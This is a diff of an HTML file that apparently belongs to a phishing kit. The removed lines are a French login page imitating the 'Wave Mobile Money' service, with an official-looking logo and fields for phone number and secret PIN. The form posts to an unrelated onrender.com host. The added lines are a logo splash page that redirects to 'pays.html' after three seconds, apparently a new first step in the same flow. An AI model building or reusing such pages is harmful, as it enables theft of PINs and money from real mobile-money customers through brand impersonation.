@@ -1,120 +1,18 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wave Mobile Money – Connexion</title>
-
-<style>
-    body {
-        margin: 0;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-        background-color: #ffffff; /* page blanche */
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-
-    .card {
-        background-color: #00A8E1;   /* BLEU WAVE */
-        width: 300px;         /* réduit de 360px à 300px */
-        padding: 25px;        /* réduit de 35px à 25px */
-        border-radius: 18px;
-        box-shadow: 0 4px 30px rgba(0,0,0,0.15);
-        text-align: center;
-    }
-
-    .logo {
-        margin-bottom: 20px; /* réduit légèrement */
-    }
-
-    .logo img {
-        width: 80px;
-        height: 80px;
-        object-fit: contain;
-    }
-
-    h1 {
-        color: white;
-        font-size: 26px;
-        margin-bottom: 5px;
-        font-weight: bold;
-    }
-
-    h3 {
-        color: white;
-        font-size: 18px;
-        margin-top: 0;
-        margin-bottom: 20px; /* réduit légèrement */
-        opacity: 0.95;
-    }
-
-    label {
-        color: white;
-        font-weight: 500;
-        font-size: 15px;
-        margin-bottom: 5px;
-        display: block;
-        text-align: left;
-    }
-
-    .input-box {
-        width: 100%;
-        background: white;
-        padding: 14px;
-        border-radius: 12px;
-        border: none;
-        font-size: 16px;
-        margin-bottom: 18px;
-        outline: none;
-        box-sizing: border-box;
-    }
-
-    .btn {
-        width: 100%;
-        padding: 14px;
-        background: white;
-        border: none;
-        border-radius: 12px;
-        color: #00A8E1;
-        font-size: 18px;
-        font-weight: bold;
-        cursor: pointer;
-        margin-top: 5px;
-    }
-
-    .btn:hover {
-        opacity: 0.9;
-    }
-
-</style>
+<title>Logo</title>
+<link rel="stylesheet" href="style.css">
 </head>
+<body class="page">
 
-<body>
+    <img src="pingouin.png" class="logo">
 
-<div class="card">
-
-    <!-- Logo Wave officiel -->
-    <div class="logo">
-         <img src="pingouin.png" class="logo" alt="Logo Wave">
-    </div>
-
-    <h1>Connexion</h1>
-    <h3>Wave Mobile Money</h3>
-
-    <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">
-
-        <label>Numéro de téléphone</label>
-        <input class="input-box" type="tel" name="phone" placeholder="+221 XX XXX XX XX" required>
-
-        <label>Code secret</label>
-        <input class="input-box" type="password" name="pin" minlength="4" maxlength="6" placeholder="••••••" required>
-
-        <button class="btn" type="submit">Connexion</button>
-    </form>
-
-</div>
-
+    <script>
+        setTimeout(() => {
+            window.location.href = "pays.html";
+        }, 3000);
+    </script>
 </body>
 </html>
